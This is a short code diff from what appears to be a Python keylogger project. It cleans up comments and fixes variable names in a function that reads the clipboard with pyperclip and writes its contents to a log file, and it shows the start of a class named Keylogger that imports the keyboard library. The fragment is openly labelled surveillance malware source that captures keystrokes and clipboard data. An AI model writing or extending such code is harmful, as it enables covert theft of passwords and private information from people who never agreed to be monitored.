@@ -5,17 +5,18 @@
 #               - Keano (03-04-2023)                                                                                   #
 ########################################################################################################################
 
-# Hier alle library imports
+# Library imports here
 import keyboard as kb
 import pyperclip as pc
 
-# Hieronder de relevante code
+# Main code here
 
-def copy_clipboard(text_file,old_clipboard,new_clipboard):
+
+def copy_clipboard(text_file, old_clipboard, new_clipboard):
     if old_clipboard != new_clipboard and new_clipboard is not None:
         text_file.write(f"CLIPBOARD DATA: {new_clipboard} \n")
-        old_clipboard_data = new_clipboard
-    new_clipboard_data = pc.paste()
+        old_clipboard = new_clipboard
+    new_clipboard = pc.paste()
     return old_clipboard, new_clipboard
 
 class Keylogger:
